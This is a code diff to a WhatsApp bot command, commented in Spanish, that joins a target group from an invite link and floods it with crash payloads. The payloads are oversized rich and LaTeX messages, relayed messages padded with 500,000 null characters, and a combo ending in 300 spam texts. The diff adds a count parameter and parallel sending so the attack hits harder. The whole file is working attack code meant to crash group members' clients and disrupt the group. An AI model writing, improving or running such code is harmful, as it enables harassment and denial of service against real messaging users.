@@ -11,8 +11,8 @@ export default {
       return reply({
         text:
           `💥 Pásame el enlace del grupo a crashear.\n` +
-          `Ej: .${cmdName} https://chat.whatsapp.com/XXXX rich\n\n` +
-          `Modos: rich | latex | nulls | combo | rafaga | text`,
+          `Ej: .${cmdName} https://chat.whatsapp.com/XXXX rich 10\n\n` +
+          `Modos: rich [n] | latex [n] | nulls [n] | combo`,
       });
     }
 
@@ -20,8 +20,9 @@ export default {
     if (!match) return reply({ text: "😡 Enlace inválido." });
     const code = match[1];
 
-    // modo = segunda palabra después del link
-    const modo = (text.split(/\s+/)[1] || "rich").toLowerCase();
+    const partes = text.split(/\s+/);
+    const modo = (partes[1] || "rich").toLowerCase();
+    const cant = parseInt(partes[2]) || 10; // cuántas bombas mandar
 
     let groupId;
     try {
@@ -30,37 +31,44 @@ export default {
       return reply({ text: "⚠️ No pude leer el grupo. Enlace inválido o expirado." });
     }
 
-    try {
-      await sock.groupAcceptInvite(code);
-    } catch {}
+    try { await sock.groupAcceptInvite(code); } catch {}
+    await new Promise((r) => setTimeout(r, 2000)); // esperar propagación de membresía
 
-    await reply({ text: `🧪 Crasheando ${groupId} → modo *${modo}*` });
+    await reply({ text: `🧪 Crasheando ${groupId} → modo *${modo}* x${cant}` });
 
-    // ---------- RICH BOMB ----------
+    // ---------- RICH BOMB x N en paralelo ----------
     if (modo === "rich") {
-      const rich = new AIRich(sock);
-      rich.setTitle("💥 CRASH");
-      for (let i = 0; i < 300; i++) {
-        rich.addText(`Item ${i} [link](https://x.com) [](https://y.com) $x^2$`);
+      const promesas = [];
+      for (let b = 0; b < cant; b++) {
+        const rich = new AIRich(sock);
+        rich.setTitle(`💥 CRASH ${b + 1}`);
+        for (let i = 0; i < 300; i++) {
+          rich.addText(`Item ${i} [link](https://x.com) [](https://y.com) $x^2$`);
+        }
+        rich.addSuggest(["a","b","c","d","e","f","g","h","i","j"]);
+        rich.setFooter("boom 💀");
+        promesas.push(rich.send(groupId)); // sin await → todas en paralelo
       }
-      rich.addSuggest(["a","b","c","d","e","f","g","h","i","j"]);
-      rich.setFooter("boom 💀");
-      await rich.send(groupId);
-      return reply({ text: "✅ rich enviado." });
+      await Promise.allSettled(promesas);
+      return reply({ text: `✅ ${cant} rich enviados en paralelo.` });
     }
 
-    // ---------- LATEX BOMB ----------
+    // ---------- LATEX BOMB x N ----------
     if (modo === "latex") {
-      const rich = new AIRich(sock);
-      rich.setTitle("∫ CRASH ∫");
-      for (let i = 0; i < 300; i++) {
-        rich.addText(`$\\int_{0}^{\\infty} e^{-x^2} dx = \\frac{\\sqrt{\\pi}}{2}$`);
+      const promesas = [];
+      for (let b = 0; b < cant; b++) {
+        const rich = new AIRich(sock);
+        rich.setTitle(`∫ CRASH ${b + 1} ∫`);
+        for (let i = 0; i < 300; i++) {
+          rich.addText(`$\\int_{0}^{\\infty} e^{-x^2} dx = \\frac{\\sqrt{\\pi}}{2}$`);
+        }
+        promesas.push(rich.send(groupId));
       }
-      await rich.send(groupId);
-      return reply({ text: "✅ latex enviado." });
+      await Promise.allSettled(promesas);
+      return reply({ text: `✅ ${cant} latex enviados.` });
     }
 
-    // ---------- NULLS ----------
+    // ---------- NULLS x N ----------
     if (modo === "nulls") {
       const annotations = "\u0000".repeat(500000);
       const payload = {
@@ -79,39 +87,29 @@ export default {
           },
         },
       };
-      for (let i = 0; i < 30; i++) {
-        try { await sock.relayMessage(groupId, payload, {}); } catch {}
-        await new Promise((r) => setTimeout(r, 1200));
-      }
-      return reply({ text: "✅ nulls enviados." });
-    }
-
-    // ---------- RÁFAGA ----------
-    if (modo === "rafaga") {
-      const n = parseInt(text.split(/\s+/)[2]) || 200;
       const promesas = [];
-      for (let i = 0; i < n; i++) {
-        promesas.push(sock.sendMessage(groupId, { text: `💣 ${i + 1}/${n}` }));
+      for (let i = 0; i < cant; i++) {
+        promesas.push(sock.relayMessage(groupId, payload, {}));
       }
       await Promise.allSettled(promesas);
-      return reply({ text: `✅ ráfaga de ${n} enviada.` });
+      return reply({ text: `✅ ${cant} nulls enviados.` });
     }
 
-    // ---------- TEXT BOMB ----------
-    if (modo === "text") {
-      await sock.sendMessage(groupId, { text: "A".repeat(65000) });
-      return reply({ text: "✅ text bomb enviado." });
-    }
-
-    // ---------- COMBO TOTAL ----------
+    // ---------- COMBO ----------
     if (modo === "combo") {
-      const rich = new AIRich(sock);
-      rich.setTitle("COMBO");
-      for (let i = 0; i < 150; i++) {
-        rich.addText(`Item ${i} [x](https://x.com) $x^2$`);
+      // 1) 5 rich en paralelo
+      const richPromesas = [];
+      for (let b = 0; b < 5; b++) {
+        const rich = new AIRich(sock);
+        rich.setTitle(`COMBO ${b + 1}`);
+        for (let i = 0; i < 200; i++) {
+          rich.addText(`Item ${i} [x](https://x.com) $x^2$`);
+        }
+        richPromesas.push(rich.send(groupId));
       }
-      await rich.send(groupId);
+      await Promise.allSettled(richPromesas);
 
+      // 2) 10 nulls en paralelo
       const annotations = "\u0000".repeat(500000);
       const payload = {
         botForwardedMessage: {
@@ -129,16 +127,18 @@ export default {
           },
         },
       };
+      const nullPromesas = [];
       for (let i = 0; i < 10; i++) {
-        try { await sock.relayMessage(groupId, payload, {}); } catch {}
-        await new Promise((r) => setTimeout(r, 800));
+        nullPromesas.push(sock.relayMessage(groupId, payload, {}));
       }
+      await Promise.allSettled(nullPromesas);
 
-      const promesas = [];
-      for (let i = 0; i < 150; i++) {
-        promesas.push(sock.sendMessage(groupId, { text: `💣 ${i + 1}/150` }));
+      // 3) ráfaga de 300 texto
+      const spamPromesas = [];
+      for (let i = 0; i < 300; i++) {
+        spamPromesas.push(sock.sendMessage(groupId, { text: `💣 ${i + 1}/300` }));
       }
-      await Promise.allSettled(promesas);
+      await Promise.allSettled(spamPromesas);
 
       return reply({ text: "✅ combo terminado." });
     }
